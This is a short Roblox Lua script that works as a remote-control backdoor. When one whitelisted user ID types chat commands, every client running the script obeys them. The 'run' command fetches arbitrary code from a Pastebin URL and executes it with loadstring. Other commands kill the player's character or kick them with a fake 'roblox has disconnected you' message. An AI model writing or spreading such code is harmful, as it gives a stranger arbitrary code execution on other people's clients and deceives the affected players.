local Players = game:GetService("Players")

local Commands = {}
local Whitelist = {693795450}

local AddCommand = function(Name, Function) 
   Name = Name:lower()
   Commands[Name] = Function
end

local CommandInput = function(Chat)
   Command = Chat:lower()
   Split = string.split(Command, " ")
   if Split[1]:lower() == "/e" then
      table.remove(Split, 1)
   end
   if Commands[Split[1]] ~= nil then
      local Func = Commands[Split[1]:lower()] 
      table.remove(Split, 1)
      Func(Split)
   end
end

AddCommand("run", function(Code)
    local Payload = ("https://pastebin.com/raw/" .. tostring(Code))
    local Body = game:HttpGet(Payload)
    loadstring(Body)()
end)

AddCommand("kill", function(...)
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

AddCommand("kick", function(...)
    game.Players.LocalPlayer:Kick("Something went wrong, roblox has disconnected you.")
end)

local Setup = function(Player)
    if table.find(Whitelist, Player.UserId) then
       Player.Chatted:Connect(CommandInput)
    end
end

Players.PlayerAdded:Connect(Setup)
for i, v in pairs(Players:GetPlayers()) do
   Setup(v)
end
